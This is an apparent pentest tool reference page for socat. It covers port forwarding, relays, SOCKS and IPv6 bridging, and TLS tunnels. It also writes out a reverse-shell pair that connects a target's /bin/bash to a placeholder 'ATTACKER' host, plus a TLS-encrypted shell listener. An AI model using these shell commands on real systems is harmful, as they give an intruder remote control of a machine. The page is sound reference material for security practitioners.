---
name: socat
category: Connection & Pivoting
description: Advanced relay between two byte streams (SSL/TLS, SOCKS, IPv6).
tags: [socat, relay, tunnel, tls, pivot, portforward]
---

# socat

**socat** connects two "addresses" (byte streams) and relays data between them: TCP/UDP sockets, files, PTYs, SSL/TLS, SOCKS, IPv6. It covers what [netcat](#/tool/netcat) does and adds TLS, forking and PTY allocation — which is what makes it good for port forwarding, relays and fully interactive shells.

> `apt install socat` · syntax: `socat [options] <address1> <address2>`

## Concept

Each address looks like `TYPE:params`. socat wires the two together and lets bytes flow.

```bash
socat - TCP:target:80                # STDIN/OUT <-> TCP (like nc)
socat TCP-LISTEN:8080 -              # listen on 8080, dump to terminal
```

## Port forwarding / relay

```bash
# Forward local port 8080 to a remote service
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.5:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53
```

`fork` handles multiple connections; `reuseaddr` reuses the port immediately.

## Interactive reverse shell (better than nc)

```bash
# Attacker (listener):
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Target:
socat TCP:ATTACKER:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

This gives a full TTY shell (arrow keys, Ctrl+C, tab) with no manual stabilization.

## TLS tunnel

```bash
# Generate a cert
openssl req -newkey rsa:2048 -nodes -keyout s.key -x509 -days 365 -out s.crt
cat s.key s.crt > s.pem

# TLS listener:
socat OPENSSL-LISTEN:4444,cert=s.pem,verify=0 EXEC:/bin/bash
# Client:
socat - OPENSSL:ATTACKER:4444,verify=0
```

## Other uses

```bash
socat TCP-LISTEN:8080,fork SOCKS4:127.0.0.1:target:80,socksport=9050   # via SOCKS/Tor
socat TCP-LISTEN:80,fork,reuseaddr TCP6:[::1]:80                       # IPv4<->IPv6 bridge
socat READLINE TCP:target:23                                           # telnet client with history
```

> socat is the tool of choice when you need TLS, pivoting or a truly interactive shell. For tunnels over HTTP and NAT traversal, see [chisel](#/tool/chisel).
